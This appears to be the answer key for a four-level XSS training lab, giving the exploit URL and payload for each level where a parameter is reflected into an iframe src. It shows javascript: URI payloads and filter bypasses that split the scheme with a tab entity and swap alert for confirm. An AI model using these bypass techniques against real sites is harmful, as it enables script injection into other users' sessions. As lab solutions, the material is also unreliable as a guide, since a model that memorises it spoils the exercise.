# inframe — solutions

Reflection into `<iframe src='...'>` with progressively stronger filters on quotes / `javascript:` / `alert`.

### inframe-xss-level1

`/inframe/level1/?url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: raw iframe src — JS URI executes

### inframe-xss-level2

`/inframe/level2/?url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: quotes stripped, but `javascript:` still allowed

### inframe-xss-level3

`/inframe/level3/?url=java%26%23x09;script:alert(1)`

- payload: `java&#x09;script:alert(1)`
- context: lowercase + literal `javascript:` strip — tab entity breaks the literal match, browser still parses URI

### inframe-xss-level4

`/inframe/level4/?url=java%26%23x09;script:confirm(1)`

- payload: `java&#x09;script:confirm(1)`
- context: same as L3 plus literal `alert` stripped — use `confirm` instead
